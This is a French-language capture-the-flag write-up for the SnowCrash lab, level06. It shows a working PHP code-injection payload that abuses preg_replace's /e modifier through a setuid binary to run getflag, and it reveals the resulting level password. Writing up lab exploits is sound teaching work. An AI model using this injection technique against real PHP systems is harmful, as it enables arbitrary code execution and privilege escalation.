# README - Exploitation du script PHP (level06)

## Étapes suivies pour obtenir le Flag06

### 1. Identification des fichiers

Le répertoire contient deux fichiers :

```bash
level06@SnowCrash:~$ ls -l
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

- **`level06`** : Un exécutable avec des permissions `setuid` pour l'utilisateur `flag06`.
- **`level06.php`** : Un script PHP appelé par l'exécutable.

### 2. Analyse du script PHP

Le script contient une vulnérabilité due à l'utilisation de l'option `/e` dans `preg_replace`. Cela permet l'évaluation dynamique de code injecté dans le fichier d'entrée :

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

L'option `/e` dans `preg_replace` indique que le résultat de l'expression régulière doit être évalué comme du code PHP. Cela signifie que tout texte capturé par le motif peut être transformé en une commande PHP, ouvrant la porte à l'exécution de code arbitraire si le contenu de l'entrée est contrôlé par un utilisateur malveillant.

### 3. Exploitation de la vulnérabilité

Nous avons créé un fichier d'entrée contenant une commande malveillante :

```bash
echo '[x {${exec(getflag)}}]' > /tmp/exploit.txt
```

Le contenu injecté, `[x {${exec(getflag)}}]`, correspond au motif dans `preg_replace`. Ce dernier évalue dynamiquement `exec(getflag)` comme une commande PHP, ce qui permet d'exécuter `getflag` pour récupérer le token.

### 4. Exécution du binaire

Lancez l'exécutable avec le fichier d'entrée :

```bash
./level06 /tmp/exploit.txt
```

### 5. Récupération du flag

Le flag est affiché dans la sortie du programme :

```bash
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

### 6. Passage à l'utilisateur suivant

Utilisez le flag pour vous connecter à l'utilisateur `level07` :

```bash
level06@SnowCrash:~$ su level07
Password: wiok45aaoguiboiki2tuin6ub
level07@SnowCrash:~$
```